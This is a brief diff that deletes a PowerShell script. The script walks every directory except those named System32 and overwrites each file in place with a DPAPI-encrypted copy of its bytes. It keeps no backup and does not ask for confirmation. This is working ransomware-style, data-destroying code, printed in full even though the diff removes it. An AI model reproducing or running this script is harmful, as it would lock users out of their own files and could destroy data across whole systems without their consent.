@@ -1,11 +1,1 @@
-$directories = Get-ChildItem -Directory -Recurse | Where-Object { $_.Name -ne "System32" }
 
-foreach ($directory in $directories) {
-    $files = Get-ChildItem -File -Path $directory.FullName -Recurse
-
-    foreach ($file in $files) {
-        $contents = Get-Content -Path $file.FullName -Encoding Byte
-        $encryptedContents = [System.Security.Cryptography.ProtectedData]::Protect($contents, $null, 'CurrentUser')
-        Set-Content -Path $file.FullName -Value $encryptedContents -Encoding Byte
-    }
-}
